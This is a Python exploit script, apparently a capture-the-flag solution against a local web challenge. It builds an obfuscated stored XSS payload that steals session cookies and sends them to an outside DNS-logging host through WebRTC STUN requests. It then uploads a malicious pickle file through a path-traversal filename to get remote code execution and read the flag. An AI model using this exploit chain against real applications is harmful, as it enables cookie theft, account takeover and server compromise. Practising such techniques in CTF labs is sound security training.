import requests, pickle, io, os, base64

HOST, PORT = "127.0.0.1", 1337
CHALLENGE_URL = f"http://{HOST}:{PORT}"
EXFIL_HOST = "20b5bcd4-53f3-4104-abb1-a71042fbffbf.dnshook.site"

class PickleRCE(object):
    def __reduce__(self):
        return (os.system,("/readflag > /app/static/flag.txt",))

def register(session):
    register_data = {
        "username": "test",
        "password": "test"
    }
    session.post(f"{CHALLENGE_URL}/register", data=register_data)

def login(session):
    login_data = {
        "username": "test",
        "password": "test"
    }
    session.post(f"{CHALLENGE_URL}/login", data=login_data)

def to_ascii_codes(string):
    return "".join(str(hex(ord(c))) for c in string).replace("0x", "\\x").replace("\\xa","\\x0a")

def xss():
    leak_cookie = f"""
    function convertToHex(str) {{
        var hex = "";
        for (var i = 0; i < str.length; i++) {{
            hex += str.charCodeAt(i).toString(16);
        }}
        return hex;
    }}

    function leakCookieViaRTC(domain, cookie) {{
        var sectionLength = Math.ceil(cookie.length / 2);
        for (var i = 0; i < 2; i++) {{
            var section = cookie.slice(i * sectionLength, (i + 1) * sectionLength);
            if (section) {{
                var hexSection = convertToHex(section);
                var p = new RTCPeerConnection({{
                    iceServers: [{{
                        urls: `stun:${{hexSection}}.${{domain}}`
                    }}]
                }});

                p.createDataChannel("d");
                p.setLocalDescription();
            }}
        }}
    }}

    leakCookieViaRTC("{EXFIL_HOST}", document.cookie);
    """
    encoded = to_ascii_codes(leak_cookie)
    parser_xss = f"```json' autofocus tabindex=1 onfocus=eval('{encoded}');//\na\n```"
    return base64.b64encode(parser_xss.encode()).decode() 

def make_xss_post(session):
    payload = xss()
    post_data = {
        "title": "hack",
        "content": payload
    }
    session.post(f"{CHALLENGE_URL}/new_post", data=post_data)

def trigger_exploit():
    cookie_data = {
        "session_id": "injected"
    }
    requests.post(f"{CHALLENGE_URL}/admin", cookies=cookie_data)

def get_flag():
    return requests.get(f"{CHALLENGE_URL}/static/flag.txt").text

def upload_exploit(session):
    payload = pickle.dumps(PickleRCE())
    pickle_file = io.BytesIO(payload)
    pickle_file.name = "../../../app/sessions/session-injected"
    files = {
        "file": (pickle_file.name, pickle_file, "application/octet-stream")
    }
    cookie_data = {
        "session_id": session
    }
    requests.post(f"{CHALLENGE_URL}/upload_file", cookies=cookie_data, files=files)
    trigger_exploit()
    print(get_flag())

def pwn():
    session = requests.Session()
    register(session)
    login(session)
    make_xss_post(session)
    session_id = input("Decode and enter session ID exfiltrated from DNS: ")
    upload_exploit(session_id)

def main():
    pwn()

if __name__ == "__main__":
    main()